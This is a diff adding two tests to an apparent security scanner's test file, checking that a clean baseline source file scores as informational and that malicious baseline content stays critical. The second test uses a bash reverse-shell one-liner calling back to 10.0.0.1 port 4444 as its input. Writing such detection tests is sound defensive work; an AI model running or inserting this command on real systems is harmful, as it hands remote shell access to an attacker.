@@ -134,6 +134,32 @@ def test_normal_text_is_benign():
     assert result["is_malicious"] is False
 
 
+def test_clean_baseline_source_file_is_informational():
+    result = _fallback_analysis(
+        "src/app.py",
+        "new",
+        "def add(left, right):\n    return left + right\n",
+        metadata={"is_baseline": True},
+    )
+
+    assert result["risk_score"] == 1
+    assert result["priority"] == "info"
+    assert result["baseline_context"] is True
+
+
+def test_malicious_baseline_content_keeps_critical_severity():
+    result = _fallback_analysis(
+        "src/maintenance.py",
+        "new",
+        "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
+        metadata={"is_baseline": True},
+    )
+
+    assert result["risk_score"] >= 8
+    assert result["priority"] == "critical"
+    assert result["baseline_context"] is True
+
+
 def test_python_reverse_shell_is_critical():
     result = _fallback_analysis(
         "test.py",
